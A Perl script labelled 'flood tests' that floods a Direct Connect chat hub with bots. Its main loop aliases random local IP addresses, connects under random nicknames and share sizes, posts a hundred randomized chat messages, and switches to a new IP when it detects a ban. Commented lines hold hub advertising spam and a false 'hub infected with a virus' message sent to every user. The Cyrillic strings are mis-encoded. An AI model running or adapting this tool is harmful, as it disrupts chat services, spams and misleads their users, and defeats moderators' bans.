#!/usr/bin/perl
# $Id: dcppp.pl 107 2006-03-01 21:45:44Z pro $ $URL$

=copyright
flood tests
Copyright (C) 2005-2006 Oleg Alexeenkov http://sourceforge.net/projects/dcppp proler@gmail.com icq#89088275

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA,
or download it from http://www.gnu.org/licenses/gpl.html
=cut

use strict;
eval { use Time::HiRes qw(time sleep); };
use lib './lib';
use dcppp::clihub;

sub fisher_yates_shuffle {
  my $deck = shift;    # $deck is a reference to an array
  my $i    = @$deck;
  while ( $i-- ) {
    my $j = int rand( $i + 1 );
    @$deck[ $i, $j ] = @$deck[ $j, $i ];
  }
  return $deck;
}

sub rand_int {
  my ( $from, $to ) = @_;
  return $from + int rand( $to - $from );
}

sub rand_char {
  my ( $from, $to ) = @_;
  #perl -e "print chr($_) for (32+65..32+65+25)"
  $from ||= 32 + 65;
  $to   ||= 32 + 65 + 25;
  return chr( rand_int( $from, $to ) );
}

sub rand_str {
  my ( $len, $from, $to ) = @_;
  $len ||= 10;
  my $ret;
  $ret .= rand_char( $from, $to ) for ( 0 .. $len );
  return $ret;
}

sub rand_str_ex {
  my ( $str, $chg ) = @_;
  $chg ||= int( length($str) / 10 );
  local @_ = split( //, $str );
  for ( 0 .. $chg ) {
    $_[ rand scalar @_ ] = rand_char();
  }
  return join '', @_;
}
print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
$ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
#for my $ipc ( map { @$_ } fisher_yates_shuffle( [ 230 .. 250 ] ) ) {
#  for my $ipd ( map { @$_ } fisher_yates_shuffle( [ 1 .. 254 ] ) ) {
TRY: for ( 0 .. 1000 ) {
  my $ipc = rand_int( 230, 255 );
  my $ipd = rand_int( 1,   254 );
  print "if create 10.131.$ipc.$ipd\n";
  print `ifconfig lo1 alias 10.131.$ipc.$ipd/32`;
  print "ok\n";

  sub if_del {
    print "if del 10.131.$ipc.$ipd\n";
    print `ifconfig lo1  10.131.$ipc.$ipd -alias`;
  }
  my $dc = dcppp::clihub->new(
    'host' => $1,
    ( $2 ? ( 'port' => $2 ) : () ),
    #    'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
    'Nick' => ( $ARGV[1] or rand_str( rand_int( 1, 10 ) ) ),
    #   'Nick'		=>	'xxxx',
    #    'sharesize' => int( rand 10000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
    'sharesize' => rand_int( 1, 1000000000000 ),
    #   'log'		=>	sub {},	# no logging
    #    'log'		=>	sub {return if $_[0] =~ /dbg|dmp/},	# no logging
    #   'min_chat_delay'	=> 0.401,
    #   'min_cmd_delay'	=> 0.401,
    'client'      => '++',
    'V'           => '0.697',
    'description' => '',
    'M'           => 'P',
    'sockopts'    => { 'LocalAddr' => "10.131.$ipc.$ipd" },
    'Version'     => rand_int( 1, 1000 ),
  );
  $dc->{'handler'}{'To'} = sub {
    for (@_) {
      print("ban test[$_]\n");
      print("BANNED! destroy.\n"), $dc->destroy(), last if /навсегда лишен права говорить в чате и привате/i;
    }
    #
  };
  if_del(), next if !$dc->{'socket'};
  #      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!' );
  for ( 1 .. 30 ) {    #sleep(5); $dc->recv();
    last if !$dc->{'socket'} or $dc->{'status'} eq 'connected';
    $dc->recv();
    sleep(1);
  }
  $dc->recv(), sleep(1) for ( 1 .. 10 );
  for ( 1 .. 100 ) {
    last if !$dc->{'socket'} or $dc->{'status'} ne 'connected';
    print("BOT SEND all\n"),
#      $dc->cmd( 'chatline', 'Ќа–оƒ, ѕр»гЋаЎа≈м ¬а— Ќа ѕр»кќл№нџй хјб 10. 139. 24 .136  !!! ¬аћ ¬с≈гƒа –аƒ HUB -=NEW-CITY=-, Ќе «аЅуƒь“е ƒоЅа¬и“ь в »зЅрјннќе!!' );
#      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!'. $_);
      $dc->cmd(
      'chatline',
      rand_str_ex(
'ƒоброго времени суток! ѕользу€сь случаем, хотим попросить ¬ас больше никогда не рекламировать свой хаб где попало. —пасибо. '
          . $_
#          . ':O:hmph::arrow::}:brow::no::(:\'(:idea:_\m/|-Om/_/:geek::geek::yes:O_O:):umm::?::sick::fear::ahoy::whistle::satan:'
#.':D:P:!::blush::w00t::errm::x;):omg:>_<:lol::roll::heart::S:sulk::naughty:(H):whatever::|:-p:crego::biggrin::sketchy::martini:'
      )
      );
    sleep(2);
  }
  #    print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, 'HUB за ражен виру сом сро чно поки ньте его!' )
  #      for keys %{ $dc->{'NickList'} };
  $dc->recv();    #sleep(5); $dc->recv();
  $dc->destroy();
  sleep(2);
  print "ok\n";
  #  }
}
